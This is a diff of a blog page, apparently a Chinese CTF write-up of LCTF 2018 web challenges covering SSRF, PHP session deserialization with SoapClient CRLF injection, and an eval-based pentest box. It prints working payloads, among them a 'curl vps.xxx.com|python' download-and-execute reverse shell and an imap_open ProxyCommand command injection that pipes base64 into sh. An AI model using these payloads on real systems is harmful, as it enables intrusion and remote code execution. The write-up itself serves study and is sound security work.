@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>LCTF 2018 部分 web 题详细 writeup | K0rz3n's Blog</title><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/6.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.2/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.2/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><link rel="stylesheet" type="text/css" href="/css/main.css?v=1.0.4"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body style="background:#fbfbfb;"><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">LCTF 2018 部分 web 题详细 writeup</h1><a id="logo" href="/.">K0rz3n's Blog</a><p class="description">Shell-is-Only-the-Beginning</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> Start</i></a><a href="/archives/"><i class="fa fa-archive"> Archiv</i></a><a href="/about/"><i class="fa fa-user"> Über</i></a><a href="/rss/"><i class="fa fa-rss"> RSS</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">LCTF 2018 部分 web 题详细 writeup</h1><div class="post-meta">Nov 21, 2018<span> | </span><span class="category"><a href="/categories/CTF/">CTF</a></span><script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="post-content"><h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>LCTF 2018 还是一如既往的来了，虽然也是出题人，但是并不代表能做出来其他师傅的题，我也是一边运维一边做题，一边听师傅们的思路，简单的看了几道题，下面是简单的记录</p>
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>LCTF 2018 部分 web 题详细 writeup | K0rz3n's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">LCTF 2018 部分 web 题详细 writeup</h1><a id="logo" href="/.">K0rz3n's Blog</a><p class="description">Shell-is-Only-the-Beginning</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Start</i></a><a href="/archives/"><i class="fa fa-archive"> Archiv</i></a><a href="/about/"><i class="fa fa-user"> Über</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">LCTF 2018 部分 web 题详细 writeup</h1><div class="post-meta">Nov 21, 2018<span> | </span><span class="category"><a href="/categories/CTF/">CTF</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Inhalte</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0X00-前言"><span class="toc-number">1.</span> <span class="toc-text">0X00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X01-Travel"><span class="toc-number">2.</span> <span class="toc-text">0X01 Travel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X02-bestphp’s-revenge"><span class="toc-number">3.</span> <span class="toc-text">0X02 bestphp’s revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X03-God-of-domain-pentest"><span class="toc-number">4.</span> <span class="toc-text">0X03 God of domain-pentest</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X04-T4lk-1s-ch34p-sh0w-m3-the-sh31l-sh0w-m3-the-sh31l-4ga1n"><span class="toc-number">5.</span> <span class="toc-text">0X04 T4lk 1s ch34p,sh0w m3 the sh31l/sh0w m3 the sh31l 4ga1n</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X05-年久失修的系统"><span class="toc-number">6.</span> <span class="toc-text">0X05 年久失修的系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X06-参考"><span class="toc-number">7.</span> <span class="toc-text">0X06 参考</span></a></li></ol></div></div><div class="post-content"><h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>LCTF 2018 还是一如既往的来了，虽然也是出题人，但是并不代表能做出来其他师傅的题，我也是一边运维一边做题，一边听师傅们的思路，简单的看了几道题，下面是简单的记录</p>
 <h2 id="0X01-Travel"><a href="#0X01-Travel" class="headerlink" title="0X01 Travel"></a><strong>0X01 Travel</strong></h2><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Travel1.png" alt="此处输入图片的描述"></p>
 <a id="more"></a>
 <p><strong>还给了代码：</strong></p>
@@ -13,37 +13,37 @@ import uuid
 
 app = create_app()
 
-@app.route(&apos;/upload/&lt;filename&gt;&apos;, methods = [&apos;PUT&apos;])            # 幂等的请求，会产生覆盖
+@app.route(&#39;/upload/&lt;filename&gt;&#39;, methods = [&#39;PUT&#39;])            # 幂等的请求，会产生覆盖
 def upload_file(filename):
-    name = request.cookies.get(&apos;name&apos;)
-    pwd = request.cookies.get(&apos;pwd&apos;)
-    if name != &apos;lctf&apos; or pwd != str(uuid.getnode()):           # 不知道硬件地址则绕不过去
+    name = request.cookies.get(&#39;name&#39;)
+    pwd = request.cookies.get(&#39;pwd&#39;)
+    if name != &#39;lctf&#39; or pwd != str(uuid.getnode()):           # 不知道硬件地址则绕不过去
         return &quot;0&quot;
     filename = urllib.unquote(filename)                         # 进行 url 解码
-    with open(os.path.join(app.config[&apos;UPLOAD_FOLDER&apos;], filename), &apos;w&apos;) as f:
+    with open(os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename), &#39;w&#39;) as f:
         f.write(request.get_data(as_text = True))
         return &quot;1&quot;
     return &quot;0&quot;
 
-@app.route(&apos;/&apos;, methods = [&apos;GET&apos;])
+@app.route(&#39;/&#39;, methods = [&#39;GET&#39;])
 def index():
-    url = request.args.get(&apos;url&apos;, &apos;&apos;)
-    if url == &apos;&apos;:
-        return render_template(&apos;index.html&apos;)
+    url = request.args.get(&#39;url&#39;, &#39;&#39;)
+    if url == &#39;&#39;:
+        return render_template(&#39;index.html&#39;)
     if &quot;http&quot; != url[: 4]:                                     # 必须要 http 请求
         return &quot;hacker&quot;
     try:
         response = requests.get(url, timeout = 10)
-        response.encoding = &apos;utf-8&apos;
+        response.encoding = &#39;utf-8&#39;
         return response.text
     except:
         return &quot;Something Error&quot;
 
-@app.route(&apos;/source&apos;, methods = [&apos;GET&apos;])
+@app.route(&#39;/source&#39;, methods = [&#39;GET&#39;])
 def get_source():
     return open(__file__).read()
 
-if __name__ == &apos;__main__&apos;:
+if __name__ == &#39;__main__&#39;:
     app.run()
 </code></pre><p>了解过 SSRF 的同学看一眼就知道是 SSRF ，但是我们的目标是什么呢？我们看到有一个文件写的点，但是我们并不知道 uuid.getnode() ，在HCTF 我们已经领略过这个函数的作用，我们知道他是主机的 mac 地址的十进制表示，于是我们希望利用SSRF 实现本地文件读取，但是这里明显有几个限制，首先限制了 协议是 http 和 https ，这就排除了我们使用 file 等协议，当然可能有人说可以使用 302 跳转，没错，requests.get() 在没有设置，allow_redirects=False 的情况下是会进行跟随的，但是如果你尝试使用 file 等其他协议他就会报错，这应该是 requests 的保护机制吧。</p>
 <p>那么这种情况下其实还是要看看开放的端口，毕竟是 flask ，万一有什么 redis 啥的未授权呢？可以直接写 shell 啥的，我使用 nmap 测试了一下发现只有80 和 22 ，没戏了，想别的办法吧。</p>
@@ -80,14 +80,14 @@ URL     : http://www.cip.cc/118.25.150.86
 <h2 id="0X02-bestphp’s-revenge"><a href="#0X02-bestphp’s-revenge" class="headerlink" title="0X02 bestphp’s revenge"></a><strong>0X02 bestphp’s revenge</strong></h2><p><strong>代码审计：</strong></p>
 <pre><code>&lt;?php
 highlight_file(__FILE__);
-$b = &apos;implode&apos;;
+$b = &#39;implode&#39;;
 call_user_func($_GET[f],$_POST);
 session_start();
-if(isset($_GET[&apos;name&apos;])){
-    $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];
+if(isset($_GET[&#39;name&#39;])){
+    $_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];
 }
 var_dump($_SESSION);
-$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);
+$a = array(reset($_SESSION),&#39;welcome_to_the_lctf2018&#39;);
 call_user_func($b,$a);
 ?&gt;
 array(0) { } 
@@ -95,10 +95,10 @@ array(0) { }
 <pre><code>&lt;?php
 
 session_start();
-echo &apos;only localhost can get flag!&apos;;
-$flag = &apos;LCTF{*************************}&apos;;
+echo &#39;only localhost can get flag!&#39;;
+$flag = &#39;LCTF{*************************}&#39;;
 if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;){
-       $_SESSION[&apos;flag&apos;] = $flag;
+       $_SESSION[&#39;flag&#39;] = $flag;
    }
 //only localhost can get flag!
 </code></pre><p>一开始看 index.php ,可以说是一脸蒙蔽了，但是后来看了 flag.php 以后目标就很清晰了，我们需要伪造我们的 remote_addr 为 Localhost 然后访问 flag.php 拿到 flag ，但我们知道 remote_addr 哪里能伪造，想要让 remote_addr 是 127.0.0.1 那只有一种方法就是实现 ssrf ，后来给了一个 hint ：反序列化，也就是我们要使用反序列化触发 ssrf 访问 flag.php 页面，并且访问的时候我们还要带上我们自己的 cookie 访问，要不然我们没法写到我们自己的 session 中，这样我们也就没法访问到 flag 了</p>
@@ -107,8 +107,8 @@ if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;){
 <p><strong>test.php</strong></p>
 <pre><code>&lt;?php
 $a = new SoapClient(null, array(
-            &apos;location&apos;=&gt; &quot;http://h4ck3r.club:9999&quot;, 
-            &apos;uri&apos;=&gt; &quot;test&quot;
+            &#39;location&#39;=&gt; &quot;http://h4ck3r.club:9999&quot;, 
+            &#39;uri&#39;=&gt; &quot;test&quot;
 )); 
 
 $a-&gt;getsubtime();
@@ -118,9 +118,9 @@ $a-&gt;getsubtime();
 <p><strong>test.php</strong></p>
 <pre><code>&lt;?php
 $a = new SoapClient(null, array(
-            &apos;location&apos;=&gt; &quot;http://h4ck3r.club:9999&quot;, 
-            &apos;user_agent&apos; =&gt; &quot;AAA:BBB\r\n&quot;.&quot;Cookie:PHPSESSID=dde63k4h9t7c9dfl79np27e912&quot;,
-            &apos;uri&apos;=&gt; &quot;test&quot;
+            &#39;location&#39;=&gt; &quot;http://h4ck3r.club:9999&quot;, 
+            &#39;user_agent&#39; =&gt; &quot;AAA:BBB\r\n&quot;.&quot;Cookie:PHPSESSID=dde63k4h9t7c9dfl79np27e912&quot;,
+            &#39;uri&#39;=&gt; &quot;test&quot;
 )); 
 $res = serialize($a);
 $a = unserialize($res);
@@ -131,8 +131,8 @@ $a-&gt;getsubtime();
 <pre><code>&lt;?php
 //...
 session_start();
-if(isset($_GET[&apos;name&apos;])){
-  $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];
+if(isset($_GET[&#39;name&#39;])){
+  $_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];
 }
 //...
 </code></pre><p>我们知道，session 是经过序列化进行存储的，我们可以试试，传入 name=K0rz3n 上面代码执行的结果是</p>
@@ -161,7 +161,7 @@ options
 <pre><code>&lt;?php
 
 session_start();
-$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);
+$a = array(reset($_SESSION),&#39;welcome_to_the_lctf2018&#39;);
 var_dump($a);
 </code></pre><p><strong>结果：</strong></p>
 <p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_best4.png" alt="此处输入图片的描述"></p>
@@ -181,7 +181,7 @@ class test{
 }
 
 $a = new test();
-call_user_func(array($a,&apos;hhh&apos;));
+call_user_func(array($a,&#39;hhh&#39;));
 
 ?&gt;
 </code></pre><p><strong>结果：</strong></p>
@@ -190,7 +190,7 @@ call_user_func(array($a,&apos;hhh&apos;));
 <p>我们要使用 extract 覆盖变量 b 为 call_user_func 然后，”welcome_to_the_lctf2018” 这个字符串就是我们的不存在的方法。最终可以实现 __call 的调用，实现发出带着我们设定好 cookie 的请求，然后 flag 被写入我们的 session 中，我们最后再带着这个 cookie 列出 session 中的内容就可以了</p>
 <h2 id="0X03-God-of-domain-pentest"><a href="#0X03-God-of-domain-pentest" class="headerlink" title="0X03 God of domain-pentest"></a><strong>0X03 God of domain-pentest</strong></h2><pre><code>&lt;?php
 highlight_file(__FILE__);
-$lshell=$_GET[&apos;lshell&apos;];
+$lshell=$_GET[&#39;lshell&#39;];
 eval($lshell);
 var_dump($lshell);
 NULL 
@@ -202,9 +202,9 @@ NULL
 <p>不多说，打！一开始使用 bash 反弹没成功，问了一下他们，他们说 Python 反弹效果更好欧，于是开始 python 反弹，结果还是不行，后来把 Payload 放在了服务器上，然后用 curl 请求 并且使用 | 交给 python 执行（向师傅们学来的操作），</p>
 <pre><code>curl vps.xxx.com|python
 </code></pre><p>然后，我们将其 base64 以后放在 payload 框架里</p>
-<pre><code>$server = &quot;x -oProxyCommand=echo\txxxxxxxxxxxxxxxxxxxxxx|base64\t-d|sh}&quot;;imap_open(&apos;{&apos;.$server.&apos;:143/imap}INBOX&apos;, &apos;&apos;, &apos;&apos;) or die(&quot;\n\nError: &quot;.imap_last_error());
+<pre><code>$server = &quot;x -oProxyCommand=echo\txxxxxxxxxxxxxxxxxxxxxx|base64\t-d|sh}&quot;;imap_open(&#39;{&#39;.$server.&#39;:143/imap}INBOX&#39;, &#39;&#39;, &#39;&#39;) or die(&quot;\n\nError: &quot;.imap_last_error());
 </code></pre><p>然后为了防止 url 传输过去的问题，还是使用 url 编码</p>
-<pre><code>%24server%20%3D%20%22x%20-oProxyCommand%3Decho%5Ctxxxxxxxxxxxxxxxxxxxxxx%7Cbase64%5Ct-d%7Csh%7D%22%3Bimap_open(&apos;%7B&apos;.%24server.&apos;%3A143%2Fimap%7DINBOX&apos;%2C%20&apos;&apos;%2C%20&apos;&apos;)%20or%20die(%22%5Cn%5CnError%3A%20%22.imap_last_error())%3B
+<pre><code>%24server%20%3D%20%22x%20-oProxyCommand%3Decho%5Ctxxxxxxxxxxxxxxxxxxxxxx%7Cbase64%5Ct-d%7Csh%7D%22%3Bimap_open(&#39;%7B&#39;.%24server.&#39;%3A143%2Fimap%7DINBOX&#39;%2C%20&#39;&#39;%2C%20&#39;&#39;)%20or%20die(%22%5Cn%5CnError%3A%20%22.imap_last_error())%3B
 </code></pre><p>然后执行就行了，成功反弹</p>
 <p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest3.png" alt="此处输入图片的描述"></p>
 <p>看一下 ip </p>
@@ -375,4 +375,4 @@ mysql&gt; select 10094-9921*@e:=@e is not null ;
 1 row in set (0.00 sec)
 </code></pre><p>这样达到了在绕过对 select 中的值的检查的同时在 update 修改了 admin 的密码的</p>
 <h2 id="0X06-参考"><a href="#0X06-参考" class="headerlink" title="0X06 参考"></a><strong>0X06 参考</strong></h2><p><a href="http://wupco.cn/hctf/ezphp.pdf" target="_blank" rel="noopener">http://wupco.cn/hctf/ezphp.pdf</a><br><a href="http://blog.securelayer7.net/owasp-top-10-penetration-testing-soap-application-mitigation/" target="_blank" rel="noopener">http://blog.securelayer7.net/owasp-top-10-penetration-testing-soap-application-mitigation/</a><br><a href="https://www.anquanke.com/post/id/153065#h2-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153065#h2-5</a><br><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a><br><a href="https://xz.aliyun.com/t/3336" target="_blank" rel="noopener">https://xz.aliyun.com/t/3336</a><br><a href="http://seaii-blog.com/index.php/2018/03/12/78.html" target="_blank" rel="noopener">http://seaii-blog.com/index.php/2018/03/12/78.html</a><br><a href="https://github.com/wonderkun/CTF_web/blob/master/web600-1/README.md?1520943473140" target="_blank" rel="noopener">https://github.com/wonderkun/CTF_web/blob/master/web600-1/README.md?1520943473140</a><br><a href="https://www.anquanke.com/post/id/164569" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164569</a><br><a href="https://www.cnblogs.com/backlion/p/8127868.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/8127868.html</a><br><a href="https://segmentfault.com/a/1190000009540449" target="_blank" rel="noopener">https://segmentfault.com/a/1190000009540449</a></p>
-</div><script type="text/javascript" src="/js/share.js?v=1.0.4" async></script><a data-url="https://www.k0rz3n.com/2018/11/21/LCTF 2018 部分 web 题 writeup/" data-id="cjv7v4tcy007vvgv8jnmok0vd" class="article-share-link">Aktie</a><div class="tags"><a href="/tags/CTF-writeup/">CTF writeup</a></div><div class="post-nav"><a href="/2018/12/09/Ubuntu 下编译并使用 Miracl 库/" class="pre">Linux 下编译并使用 Miracl 库</a><a href="/2018/11/20/HCTF 2018 web 部分题目 详细 writeup/" class="next">HCTF 2018 web 部分题目 详细 writeup</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="side_toc"><div style="position:fixed" class="toc-article"><div class="toc-title">Inhalte</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0X00-前言"><span class="toc-number">1.</span> <span class="toc-text">0X00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X01-Travel"><span class="toc-number">2.</span> <span class="toc-text">0X01 Travel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X02-bestphp’s-revenge"><span class="toc-number">3.</span> <span class="toc-text">0X02 bestphp’s revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X03-God-of-domain-pentest"><span class="toc-number">4.</span> <span class="toc-text">0X03 God of domain-pentest</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X04-T4lk-1s-ch34p-sh0w-m3-the-sh31l-sh0w-m3-the-sh31l-4ga1n"><span class="toc-number">5.</span> <span class="toc-text">0X04 T4lk 1s ch34p,sh0w m3 the sh31l/sh0w m3 the sh31l 4ga1n</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X05-年久失修的系统"><span class="toc-number">6.</span> <span class="toc-text">0X05 年久失修的系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X06-参考"><span class="toc-number">7.</span> <span class="toc-text">0X06 参考</span></a></li></ol></div></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">K0rz3n's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/byoungd/pure"> Pure Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/byoungd"> byoungd.</a></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=1.0.4" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.0.47/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.4" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.0.47/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.4"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.4"></script><script type="text/javascript" src="/js/prism.js?v=1.0.4"></script></div></body></html>
+</div><div class="tags"><a href="/tags/CTF-writeup/">CTF writeup</a></div><div class="post-nav"><a class="pre" href="/2018/12/09/Ubuntu 下编译并使用 Miracl 库/">Linux 下编译并使用 Miracl 库</a><a class="next" href="/2018/11/20/HCTF 2018 web 部分题目 详细 writeup/">HCTF 2018 web 部分题目 详细 writeup</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="https://www.k0rz3n.com"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Kategorien</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/APT/">APT</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/C-C/">C&C</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kerberos/">Kerberos</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/learning/">learning</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/php/">php</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/wireshark/">wireshark</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘/">备忘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘-笔记/">备忘 笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/学习思考/">学习思考</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发/">开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞分析/">漏洞分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞研究/">漏洞研究</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境搭建/">环境搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/翻译/">翻译</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/论文/">论文</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔/">随笔</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/渗透测试-技巧/" style="font-size: 15px;">渗透测试 技巧</a> <a href="/tags/工具-渗透测试/" style="font-size: 15px;">工具 渗透测试</a> <a href="/tags/备忘-反向代理-配置/" style="font-size: 15px;">备忘 反向代理 配置</a> <a href="/tags/开发-Github-备忘/" style="font-size: 15px;">开发 Github 备忘</a> <a href="/tags/配置-备忘/" style="font-size: 15px;">配置 备忘</a> <a href="/tags/Linux-渗透测试-备忘/" style="font-size: 15px;">Linux 渗透测试 备忘</a> <a href="/tags/编程-Python-进阶-备忘/" style="font-size: 15px;">编程 Python 进阶 备忘</a> <a href="/tags/网络安全-Python语法/" style="font-size: 15px;">网络安全 Python语法</a> <a href="/tags/learning/" style="font-size: 15px;">learning</a> <a href="/tags/gcc-备忘-笔记/" style="font-size: 15px;">gcc 备忘 笔记</a> <a href="/tags/Windows-FTP搭建-备忘/" style="font-size: 15px;">Windows FTP搭建 备忘</a> <a href="/tags/学习发现/" style="font-size: 15px;">学习发现</a> <a href="/tags/CTF-Tools/" style="font-size: 15px;">CTF Tools</a> <a href="/tags/笔记/" style="font-size: 15px;">笔记</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/kali/" style="font-size: 15px;">kali</a> <a href="/tags/SQL/" style="font-size: 15px;">SQL</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/网络安全-Google-Hacking-信息收集-渗透测试/" style="font-size: 15px;">网络安全 Google Hacking 信息收集 渗透测试</a> <a href="/tags/J2EE-基础/" style="font-size: 15px;">J2EE 基础</a> <a href="/tags/前端/" style="font-size: 15px;">前端</a> <a href="/tags/随笔/" style="font-size: 15px;">随笔</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/web安全-漏洞-CTF/" style="font-size: 15px;">web安全  漏洞  CTF</a> <a href="/tags/PHP-备忘-笔记/" style="font-size: 15px;">PHP 备忘 笔记</a> <a href="/tags/渗透测试-windows-后门/" style="font-size: 15px;">渗透测试 windows 后门</a> <a href="/tags/sql/" style="font-size: 15px;">sql</a> <a href="/tags/php语法/" style="font-size: 15px;">php语法</a> <a href="/tags/wireshark/" style="font-size: 15px;">wireshark</a> <a href="/tags/编程/" style="font-size: 15px;">编程</a> <a href="/tags/Linux-备忘/" style="font-size: 15px;">Linux 备忘</a> <a href="/tags/备忘/" style="font-size: 15px;">备忘</a> <a href="/tags/备忘-shell-Linux/" style="font-size: 15px;">备忘 shell Linux</a> <a href="/tags/工具使用/" style="font-size: 15px;">工具使用</a> <a href="/tags/网络安全-渗透测试-内网代理/" style="font-size: 15px;">网络安全 渗透测试 内网代理</a> <a href="/tags/渗透测试-局域网扫描/" style="font-size: 15px;">渗透测试 局域网扫描</a> <a href="/tags/备忘-dcoker-getshell-CTF/" style="font-size: 15px;">备忘 dcoker getshell CTF</a> <a href="/tags/APT/" style="font-size: 15px;">APT</a> <a href="/tags/网络安全-渗透测试-sqlmap/" style="font-size: 15px;">网络安全 渗透测试 sqlmap</a> <a href="/tags/静态检测/" style="font-size: 15px;">静态检测</a> <a href="/tags/转载/" style="font-size: 15px;">转载</a> <a href="/tags/Fuzz-XSS/" style="font-size: 15px;">Fuzz XSS</a> <a href="/tags/笔记-协议分析/" style="font-size: 15px;">笔记 协议分析</a> <a href="/tags/Redis-备忘/" style="font-size: 15px;">Redis 备忘</a> <a href="/tags/web安全-CTF-渗透测试-PHP/" style="font-size: 15px;">web安全 CTF 渗透测试 PHP</a> <a href="/tags/CSP/" style="font-size: 15px;">CSP</a> <a href="/tags/Java-备忘-笔记/" style="font-size: 15px;">Java 备忘 笔记</a> <a href="/tags/域渗透/" style="font-size: 15px;">域渗透</a> <a href="/tags/JSONP/" style="font-size: 15px;">JSONP</a> <a href="/tags/编程-C-类库/" style="font-size: 15px;">编程 C++ 类库</a> <a href="/tags/java-备忘/" style="font-size: 15px;">java 备忘</a> <a href="/tags/web安全-CTF/" style="font-size: 15px;">web安全 CTF</a> <a href="/tags/CTF-writeup/" style="font-size: 15px;">CTF writeup</a> <a href="/tags/web安全-MySQL-渗透测试/" style="font-size: 15px;">web安全 MySQL 渗透测试</a> <a href="/tags/编程-PHP-基础/" style="font-size: 15px;">编程 PHP 基础</a> <a href="/tags/网络安全-沙盒逃逸-Python/" style="font-size: 15px;">网络安全 沙盒逃逸 Python</a> <a href="/tags/SQL-语法/" style="font-size: 15px;">SQL 语法</a> <a href="/tags/web安全-漏洞分析/" style="font-size: 15px;">web安全 漏洞分析</a> <a href="/tags/网络安全-钓鱼-恶意代码分析-漏洞分析/" style="font-size: 15px;">网络安全 钓鱼 恶意代码分析 漏洞分析</a> <a href="/tags/漏洞研究/" style="font-size: 15px;">漏洞研究</a> <a href="/tags/密码学-网络协议/" style="font-size: 15px;">密码学 网络协议</a> <a href="/tags/fuzz/" style="font-size: 15px;">fuzz</a> <a href="/tags/编程-PHP-进阶/" style="font-size: 15px;">编程 PHP 进阶</a> <a href="/tags/Fuzz/" style="font-size: 15px;">Fuzz</a> <a href="/tags/爬虫/" style="font-size: 15px;">爬虫</a> <a href="/tags/符号执行/" style="font-size: 15px;">符号执行</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/编程-JAVA-基础/" style="font-size: 15px;">编程 JAVA 基础</a> <a href="/tags/污点分析/" style="font-size: 15px;">污点分析</a> <a href="/tags/PHP-静态检测/" style="font-size: 15px;">PHP 静态检测</a> <a href="/tags/Windows-批处理-备忘/" style="font-size: 15px;">Windows 批处理 备忘</a> <a href="/tags/SQL-注入/" style="font-size: 15px;">SQL 注入</a> <a href="/tags/流量分析/" style="font-size: 15px;">流量分析</a> <a href="/tags/编程-C-基础/" style="font-size: 15px;">编程 C++ 基础</a> <a href="/tags/编程-进阶/" style="font-size: 